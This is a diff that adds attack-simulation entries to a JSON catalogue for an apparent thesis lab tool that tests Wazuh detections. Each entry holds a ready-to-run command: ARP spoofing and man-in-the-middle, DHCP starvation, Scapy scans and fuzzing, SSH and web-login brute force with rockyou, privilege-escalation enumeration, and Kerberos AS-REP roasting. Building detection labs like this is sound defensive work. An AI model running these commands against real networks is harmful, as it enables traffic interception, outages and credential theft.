@@ -38,5 +38,393 @@
       }
     ],
     "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: MAC Flooding detected on Port 1 - Interface {{interface}} - {{count}} packets sent - CAM Table Overflow confirmed - MITRE:T1557\""
+  },
+  {
+    "id": "LAN-002",
+    "name": "Switch Port Stealing",
+    "module": "LAN",
+    "mitre_id": "T1557",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100501,
+    "description": "Roba el puerto del switch de un host específico enviando tramas ARP falsificadas con su MAC, redirigiendo su tráfico al atacante de forma quirúrgica.",
+    "command": "sudo arpspoof -i {{interface}} {{target_ip}}",
+    "parameters": [
+      {
+        "name": "interface",
+        "label": "Interfaz de red",
+        "type": "text",
+        "default": "eth0",
+        "required": true,
+        "placeholder": "eth0",
+        "hint": "Interfaz conectada al mismo segmento Capa 2 que la víctima"
+      },
+      {
+        "name": "target_ip",
+        "label": "IP de la víctima",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.50",
+        "hint": "IP del host cuyo puerto del switch queremos robar"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Switch Port Stealing detected targeting {{target_ip}} on Interface {{interface}} - MITRE:T1557\""
+  },
+  {
+    "id": "LAN-003",
+    "name": "SPAN / Port Mirror",
+    "module": "LAN",
+    "mitre_id": "T1040",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100502,
+    "description": "Captura tráfico de red en modo promiscuo guardando los paquetes en un archivo PCAP para análisis posterior.",
+    "command": "sudo tcpdump -i {{interface}} -c 200 -w /tmp/cs_mirror.pcap",
+    "parameters": [
+      {
+        "name": "interface",
+        "label": "Interfaz de red",
+        "type": "text",
+        "default": "eth0",
+        "required": true,
+        "placeholder": "eth0",
+        "hint": "Limitar siempre con -c 200. Sin límite puede llenar el disco de Kali."
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: SPAN/Port Mirror capture on Interface {{interface}} - MITRE:T1040\""
+  },
+  {
+    "id": "LAN-004",
+    "name": "Túneles / Canales Encubiertos",
+    "module": "LAN",
+    "mitre_id": "T1048",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100503,
+    "description": "Simula exfiltración de datos inyectando una firma en paquetes ICMP hacia el objetivo sin necesidad de servidor externo.",
+    "command": "sudo nping --icmp --data-string 'exfiltration_test' {{target}}",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.1",
+        "hint": "No requiere servidor externo escuchando"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Covert Channel ICMP Tunnel detected targeting {{target}} - MITRE:T1048\""
+  },
+  {
+    "id": "LAN-005a",
+    "name": "ARP Spoofing — Inyección de tráfico",
+    "module": "LAN",
+    "mitre_id": "T1557",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100504,
+    "description": "Inyecta respuestas ARP falsas envenenando la caché del host víctima sin interceptar tráfico (fase de preparación MitM).",
+    "command": "sudo arpspoof -i {{interface}} {{target_ip}}",
+    "parameters": [
+      {
+        "name": "interface",
+        "label": "Interfaz de red",
+        "type": "text",
+        "default": "eth0",
+        "required": true,
+        "placeholder": "eth0",
+        "hint": "Interfaz en el mismo segmento Capa 2"
+      },
+      {
+        "name": "target_ip",
+        "label": "IP de la víctima",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.50",
+        "hint": "IP del host a envenenar"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: ARP Traffic Injection detected targeting {{target_ip}} on {{interface}} - MITRE:T1557\""
+  },
+  {
+    "id": "LAN-005b",
+    "name": "ARP Spoofing — Man in the Middle",
+    "module": "LAN",
+    "mitre_id": "T1557",
+    "risk_level": "CRITICAL",
+    "wazuh_rule_id": "100504b",
+    "description": "Intercepta tráfico entre víctima y gateway activando IP forwarding para MitM silencioso bidireccional.",
+    "command": "sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward && arpspoof -i {{interface}} -t {{target}} {{gateway}}'",
+    "parameters": [
+      {
+        "name": "interface",
+        "label": "Interfaz de red",
+        "type": "text",
+        "default": "eth0",
+        "required": true,
+        "placeholder": "eth0",
+        "hint": "Interfaz en el mismo segmento Capa 2"
+      },
+      {
+        "name": "target",
+        "label": "IP de la víctima",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.50",
+        "hint": "IP del host a interceptar"
+      },
+      {
+        "name": "gateway",
+        "label": "IP del gateway",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.1",
+        "hint": "IP del router/gateway de la red"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: ARP Spoofing MitM detected targeting {{target}} via {{gateway}} on {{interface}} - MITRE:T1557\""
+  },
+  {
+    "id": "LAN-006",
+    "name": "DHCP Starvation / Rogue DHCP",
+    "module": "LAN",
+    "mitre_id": "T1498",
+    "risk_level": "CRITICAL",
+    "wazuh_rule_id": 100505,
+    "description": "Agota el pool DHCP del segmento solicitando todas las IPs disponibles y permite desplegar un servidor DHCP falso.",
+    "command": "sudo yersinia dhcp -G -i {{interface}}",
+    "parameters": [
+      {
+        "name": "interface",
+        "label": "Interfaz de red",
+        "type": "text",
+        "default": "eth0",
+        "required": true,
+        "placeholder": "eth0",
+        "hint": "PELIGROSO en red real. Solo en laboratorio Proxmox aislado."
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: DHCP Starvation/Rogue server detected on {{interface}} - MITRE:T1498\""
+  },
+  {
+    "id": "SCAPY-001",
+    "name": "Scapy SYN Scan",
+    "module": "SCAPY",
+    "mitre_id": "T1046",
+    "risk_level": "MEDIUM",
+    "wazuh_rule_id": 100506,
+    "description": "Escaneo sigiloso Half-Open (SYN) usando Scapy para detectar puertos abiertos sin completar el handshake TCP.",
+    "command": "sudo python3 -c \"from scapy.all import *; sr1(IP(dst='{{target}}')/TCP(dport=80,flags='S'))\"",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.1",
+        "hint": "Siempre prefijo sudo. Scapy requiere privilegios para forjar paquetes TCP."
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Scapy SYN Stealth Scan detected against {{target}} - MITRE:T1046\""
+  },
+  {
+    "id": "SCAPY-002",
+    "name": "Scapy ACK Scan",
+    "module": "SCAPY",
+    "mitre_id": "T1046",
+    "risk_level": "MEDIUM",
+    "wazuh_rule_id": 100507,
+    "description": "Escaneo ACK para detectar si un puerto está filtrado por firewall stateful. RST = no filtrado, sin respuesta = filtrado.",
+    "command": "sudo python3 -c \"from scapy.all import *; sr1(IP(dst='{{target}}')/TCP(dport=80,flags='A'))\"",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.1",
+        "hint": "Detecta si un puerto está filtrado por firewall stateful"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Scapy ACK Firewall Evasion Scan detected against {{target}} - MITRE:T1046\""
+  },
+  {
+    "id": "SCAPY-003",
+    "name": "Scapy ARP Scan",
+    "module": "SCAPY",
+    "mitre_id": "T1018",
+    "risk_level": "LOW",
+    "wazuh_rule_id": 100508,
+    "description": "Escaneo de descubrimiento ARP en la subred local para identificar hosts activos en Capa 2.",
+    "command": "sudo python3 -c \"from scapy.all import *; arping('{{target_subnet}}')\"",
+    "parameters": [
+      {
+        "name": "target_subnet",
+        "label": "Subred objetivo (CIDR)",
+        "type": "text",
+        "default": "192.168.1.0/24",
+        "required": true,
+        "placeholder": "192.168.1.0/24",
+        "hint": "Solo funciona en misma subred Capa 2. No es enrutable."
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Scapy ARP Discovery Scan detected on subnet {{target_subnet}} - MITRE:T1018\""
+  },
+  {
+    "id": "SCAPY-004",
+    "name": "Scapy Fuzzing (ICMP/TCP)",
+    "module": "SCAPY",
+    "mitre_id": "T1498",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100509,
+    "description": "Inyecta paquetes ICMP malformados generados aleatoriamente para probar la robustez del stack de red del objetivo.",
+    "command": "sudo python3 -c \"from scapy.all import *; send(fuzz(IP(dst='{{target}}')/ICMP()),count=100)\"",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.1",
+        "hint": "count=100 es OBLIGATORIO. No aumentar en el TFG."
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Scapy Protocol Fuzzing detected against {{target}} - MITRE:T1498\""
+  },
+  {
+    "id": "BF-001",
+    "name": "Fuerza Bruta SSH (Medusa)",
+    "module": "BRUTE",
+    "mitre_id": "T1110",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100510,
+    "description": "Ataque de fuerza bruta contra servicio SSH usando diccionario rockyou.txt con Medusa.",
+    "command": "sudo medusa -h {{target}} -u {{username}} -P /usr/share/wordlists/rockyou.txt -M ssh",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.50",
+        "hint": "Host con servicio SSH activo"
+      },
+      {
+        "name": "username",
+        "label": "Usuario a atacar",
+        "type": "text",
+        "default": "root",
+        "required": true,
+        "placeholder": "root",
+        "hint": "Usuario SSH objetivo del ataque"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: SSH Brute Force attack detected against {{target}} user {{username}} - MITRE:T1110\""
+  },
+  {
+    "id": "BF-002",
+    "name": "Fuerza Bruta Web (Hydra)",
+    "module": "BRUTE",
+    "mitre_id": "T1110",
+    "risk_level": "HIGH",
+    "wazuh_rule_id": 100511,
+    "description": "Ataque de fuerza bruta contra formulario web HTTP usando diccionario rockyou.txt con Hydra.",
+    "command": "sudo hydra -l {{username}} -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form '{{login_path}}:{{post_body}}:{{fail_string}}'",
+    "parameters": [
+      {
+        "name": "target",
+        "label": "IP/Host del objetivo",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "192.168.1.50",
+        "hint": "Host con formulario web de login"
+      },
+      {
+        "name": "username",
+        "label": "Usuario a atacar",
+        "type": "text",
+        "default": "admin",
+        "required": true,
+        "placeholder": "admin",
+        "hint": "Usuario del formulario web"
+      },
+      {
+        "name": "login_path",
+        "label": "Ruta del formulario",
+        "type": "text",
+        "default": "/login",
+        "required": true,
+        "placeholder": "/login",
+        "hint": "Path del endpoint de autenticación"
+      },
+      {
+        "name": "post_body",
+        "label": "Cuerpo POST",
+        "type": "text",
+        "default": "username=^USER^&password=^PASS^",
+        "required": true,
+        "placeholder": "username=^USER^&password=^PASS^",
+        "hint": "^USER^ y ^PASS^ son marcadores de Hydra, no cambiar"
+      },
+      {
+        "name": "fail_string",
+        "label": "Cadena de fallo",
+        "type": "text",
+        "default": "Invalid",
+        "required": true,
+        "placeholder": "Invalid",
+        "hint": "Texto que aparece en la respuesta cuando el login falla"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Web Brute Force attack detected against {{target}} user {{username}} - MITRE:T1110\""
+  },
+  {
+    "id": "PRIV-001",
+    "name": "Escalada de Privilegios Local",
+    "module": "PRIVESC",
+    "mitre_id": "T1548",
+    "risk_level": "CRITICAL",
+    "wazuh_rule_id": 100512,
+    "description": "Enumera vectores de escalada de privilegios local: binarios SUID, permisos sudo y tareas cron programadas.",
+    "command": "sudo sh -c 'echo \"=== SUID ===\" && find / -perm -4000 2>/dev/null && echo \"=== SUDO ===\" && sudo -l 2>/dev/null && echo \"=== CRON ===\" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null'",
+    "parameters": [],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Local Privilege Escalation enumeration executed - SUID/sudo/cron audit - MITRE:T1548\""
+  },
+  {
+    "id": "PRIV-002",
+    "name": "Escalada de Dominio (Kerberos ASREPRoast)",
+    "module": "PRIVESC",
+    "mitre_id": "T1558",
+    "risk_level": "CRITICAL",
+    "wazuh_rule_id": 100513,
+    "description": "Enumera usuarios de Active Directory con kerbrute y extrae hashes Kerberos AS-REP para cracking offline.",
+    "command": "sudo sh -c 'kerbrute userenum --dc {{dc_ip}} -d {{domain}} /usr/share/wordlists/usernames.txt && impacket-GetNPUsers {{domain}}/ -dc-ip {{dc_ip}} -usersfile /usr/share/wordlists/usernames.txt -no-pass -format hashcat'",
+    "parameters": [
+      {
+        "name": "dc_ip",
+        "label": "IP del Domain Controller",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "10.10.10.100",
+        "hint": "IP del controlador de dominio Active Directory"
+      },
+      {
+        "name": "domain",
+        "label": "Dominio AD",
+        "type": "text",
+        "default": "",
+        "required": true,
+        "placeholder": "corp.local",
+        "hint": "Nombre FQDN del dominio Active Directory"
+      }
+    ],
+    "logger_command": "logger -t CyberShield -p local0.alert \"SEC_VIOLATION: Kerberos ASREPRoast attack detected against DC {{dc_ip}} domain {{domain}} - MITRE:T1558\""
   }
 ]
